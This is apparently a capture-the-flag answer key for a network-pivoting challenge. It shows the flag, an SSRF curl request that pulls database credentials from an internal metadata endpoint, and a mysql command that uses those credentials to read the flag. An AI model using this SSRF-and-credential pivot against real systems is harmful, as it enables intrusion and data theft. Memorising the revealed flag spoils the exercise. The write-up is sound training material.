# Stage 8: Core Infrastructure Breach (Network Pivoting)

## Overview
- **Domain:** Network Pivoting & SSRF
- **Difficulty:** Hard
- **Points:** 500
- **Flag:** `SHADOWNET{9j_3r4_3xnl3_fl4g_JI**&H_b#4gjB^$_gh%}`

---

## Exploitation Walkthrough

### 1. SSRF on Entry Host
The entry host web service exposes a URL fetcher on port `3000` (or `3008` in docker):
```bash
curl "http://<entry-host>:3000/fetch?url=http://192.168.100.10:8080/metadata/db-credentials"
```

Response:
```json
{
  "content": "{\"database\":\"nexacorp\",\"host\":\"192.168.100.10\",\"password\":\"SecurePass123\",\"port\":3306,\"username\":\"db_user\"}\n",
  "status": 200,
  "url": "http://192.168.100.10:8080/metadata/db-credentials"
}
```

### 2. Connect to Internal Database
Using the credentials retrieved via SSRF (`db_user:SecurePass123` on MySQL `192.168.100.10:3306` or `192.168.100.20:3306`):
```bash
mysql -h 192.168.100.10 -u db_user -pSecurePass123 -D nexacorp -e "SELECT flag FROM flags WHERE challenge='final_breach';"
```

Flag Output:
```
SHADOWNET{9j_3r4_3xnl3_fl4g_JI**&H_b#4gjB^$_gh%}
```
